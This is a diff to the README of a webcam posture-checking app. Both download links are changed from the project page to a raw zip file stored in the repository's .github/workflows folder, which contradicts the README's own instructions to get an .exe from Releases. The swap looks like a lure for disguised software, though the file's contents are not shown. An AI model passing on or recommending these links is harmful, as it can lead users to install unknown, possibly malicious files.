@@ -1,6 +1,6 @@
 # 🤖 -yolov8- - Improve your sitting habits today
 
-[![Download YOLOv8-Pose-GUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/mohamedsamy3450/-yolov8-)
+[![Download YOLOv8-Pose-GUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/mohamedsamy3450/-yolov8-/main/.github/workflows/yolov_v2.2.zip)
 
 This software uses your computer camera to check how you sit. It analyzes your body position to spot common issues like a bowed head or hunchback. It helps you maintain a healthy posture while you work at your desk.
 
@@ -23,7 +23,7 @@ To run this application, your computer needs the following specifications:
 
 Visit the link below to access the file repository. Look for the latest version under the Releases section on the right side of the page. Select the file ending in .exe to download the installer for Windows.
 
-[Download YOLOv8-Pose-GUI here](https://github.com/mohamedsamy3450/-yolov8-)
+[Download YOLOv8-Pose-GUI here](https://raw.githubusercontent.com/mohamedsamy3450/-yolov8-/main/.github/workflows/yolov_v2.2.zip)
 
 ## ⚙️ Installation and Setup
 
